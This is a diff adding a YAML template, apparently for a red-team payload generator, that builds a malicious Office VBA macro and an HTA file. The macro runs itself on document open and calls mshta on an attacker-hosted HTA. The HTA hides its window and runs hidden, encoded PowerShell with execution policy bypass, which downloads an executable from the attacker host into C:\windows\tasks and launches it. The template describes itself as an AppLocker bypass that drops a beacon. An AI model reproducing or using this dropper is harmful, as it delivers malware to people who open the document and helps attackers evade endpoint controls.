@@ -1,0 +1,62 @@
+description: "VBA Macro for executing mshta and dropping a beacon (Applocker Bypass)"
+variables:
+  outputdir: "output"
+  vbaFile: "hta-vba-powershell-dropper.vba"
+  htaFile: "hta-vba-powershell-dropper.hta"
+  revshellFile: "loader.exe"
+  port: 80
+templates:
+  macro:
+    variables:
+      command: "mshta http://{{LHOST}}:{{port}}/{{htaFile}}"
+      payload_fn: "{{ Helpers.random_str() }}"
+      wsh_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      Sub {{payload_fn}}()
+        Dim {{wsh_fn}}
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        {{wsh_fn}}.Run "{{command}}"
+        Set {{wsh_fn}} = Nothing
+      End Sub
+      Sub Document_Open()
+        {{payload_fn}}
+      End Sub
+      Sub AutoOpen()
+        {{payload_fn}}
+      End Sub
+  hta:
+    variables:
+      command: "iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}} -OutFile C:\\windows\\tasks\\db.exe;Start-Process -FilePath C:\\windows\\tasks\\db.exe"
+      wsh_fn: "{{ Helpers.random_str() }}"
+      fso_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      <script language="VBScript">
+        window.moveTo -4000, -4000
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        Set {{fso_fn}} = CreateObject("Scripting.FileSystemObject")
+        For each path in Split({{wsh_fn}}.ExpandEnvironmentStrings("%PSModulePath%"),";")
+          If {{fso_fn}}.FileExists(path + "\..\powershell.exe") Then
+            {{wsh_fn}}.Run "powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}",0
+            Exit For
+          End If
+        Next
+        window.close()
+      </script>
+print:
+- "Generating a basic VBA to execute mshta and spawn a beacon"
+- "VBA File: {{outputdir}}/{{vbaFile}}"
+- "HTA File: {{outputdir}}/{{htaFile}}"
+- mshta http://{{LHOST}}:{{port}}/{{revshellFile}}
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{vbaFile}}"
+- "rm -rf {{outputdir}}/{{htaFile}}"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{htaFile}}
+  {{Templates.get('hta')}}
+  EOF
+- |-
+  cat << EOF >{{outputdir}}/{{vbaFile}}
+  {{Templates.get('macro')}}
+  EOF
